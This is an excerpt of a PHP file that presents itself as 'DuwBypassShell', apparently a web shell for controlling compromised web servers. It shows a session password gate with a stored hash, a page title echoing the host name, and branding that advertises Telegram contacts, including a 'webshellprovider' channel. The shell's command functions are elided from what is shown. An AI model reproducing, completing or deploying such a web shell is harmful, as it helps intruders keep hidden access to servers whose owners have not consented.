...
if (!isset($_SESSION['authenticated'])) {
    $stored_hashed_password = '$2y$10$PK1PFGyTHOFcR5.n4U1P8ujEHgSOgYhHAJncjtlvBr.OybvmwmENm'; // Use PASSWORD_DEFAULT hash u can use this site https://phppasswordhash.com/ for generate ur password >  Gunakan hash PASSWORD_DEFAULT Anda dapat menggunakan situs ini https://phppasswordhash.com/ untuk menghasilkan kata sandi Anda
...
<head>
    ...
    <title>DuwBypassShell [ <?= $_SERVER['SERVER_NAME']; ?> ]</title>
...
<body>
    <div class="menu-header">
        <ul>
            ...
            <li><i class="fa-brands fa-telegram"></i></i>&nbsp;t.me/huyduc1013 x t.me/webshellprovider</li>
            <li class="logo-gecko"><img width="400" height="400" src="https://raw.githubusercontent.com/hducdev/buihuyduc9173/refs/heads/main/duw.png" align="right"></li>
